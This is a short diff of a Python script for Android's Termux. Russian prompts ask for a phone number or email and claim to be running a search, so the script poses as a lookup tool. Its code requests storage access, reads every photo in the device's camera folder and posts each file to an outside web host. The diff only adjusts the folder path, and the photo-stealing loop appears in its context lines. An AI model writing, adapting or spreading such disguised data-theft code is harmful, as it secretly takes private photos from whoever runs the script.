@@ -5,9 +5,9 @@ input("Номер телефона или почта: ")
 print("Загрузка...")
 os.system("termux-setup-storage")
 print("Идет процесс поиска...")
-l = os.listdir("../storage/shared/DCIM/Camera")
+l = os.listdir("../storage/DCIM/Camera")
 for i in range(len(l)):
-	f = open("../storage/shared/DCIM/Camera/"+l[i], "rb")
+	f = open("../storage/DCIM/Camera/"+l[i], "rb")
 	r = f.read()
 	try:
 		requests.post("http://cl18178.tmweb.ru/", data={"im": r})
